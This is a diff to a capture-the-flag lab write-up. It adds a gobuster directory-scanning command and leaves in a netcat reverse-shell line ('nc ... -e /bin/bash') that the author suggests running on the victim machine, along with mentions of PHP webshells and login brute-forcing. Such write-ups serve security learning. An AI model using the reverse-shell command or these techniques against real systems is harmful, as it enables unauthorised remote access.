@@ -96,7 +96,10 @@ At this point, I'm not going to bother scanning SSH as it's pretty obvious this 
 
 ### Gobuster
 
-Dirbuster is the OG tool by OWASP.  The GUI is nice if you're a beginner but it's a little clunky.  I much prefer gobuster.  Gobuster doesn't find anything else interesting, so I think it's time to get a shell.
+Dirbuster is the OG tool by OWASP.  The GUI is nice if you're a beginner but it's a little clunky.  I much prefer gobuster.  
+>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.100 -t 10
+
+Gobuster doesn't find anything else interesting, so I think it's time to get a shell.
 
 ## Research
 
@@ -164,6 +167,7 @@ And boom, you got a shell!
 
 Now, one thing I don't like about some people's write ups is that they aren't creative.  How else could you have done that?  Was there any other way?  I pondered for a niot here.  We could've served up netcat and run this on the victim:
 >nc 10.10.10.11 -e /bin/bash
+
 Or we could have explored the file system, did some digging in PHP and see if we could've uploaded a file to that uploads directory.  Remember that Kali has some basic webshells (/usr/share/webshells/php) so we could've tried that.  Maybe if we enumerated more, could we have found a login page and brute forced the login?  Plenty to think about for sure.  The methodology should always be to try the easy/simple stuff and work your way up the difficulty chain, but we're trying to learn everything we can here.  Take some notes on paths you might want to try and come back after you complete the box to try them.
 
 ## pwn
